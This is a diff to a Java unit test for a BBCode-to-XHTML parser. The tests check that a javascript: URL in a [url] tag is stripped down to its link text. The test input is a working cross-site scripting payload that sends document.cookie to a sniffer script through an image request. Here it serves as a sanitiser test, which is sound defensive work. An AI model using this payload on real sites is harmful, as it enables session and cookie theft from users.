@@ -24,7 +24,14 @@ public class OldParseTest {
     public void urlEscapeTest(){
         Assert.assertEquals(ParserUtil.bb2xhtml(
                 "[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]", null),
-                "<p><s>javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s></p>");
+                "<p><s>Test</s></p>");
+    }
+
+    @Test
+    public void urlEscapeWithTagsTest(){
+        Assert.assertEquals(ParserUtil.bb2xhtml(
+                "[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]T[i]e[/i]st[/url]", null),
+                "<p><s>T<i>e</i>st</s></p>");
     }
 
     @Test
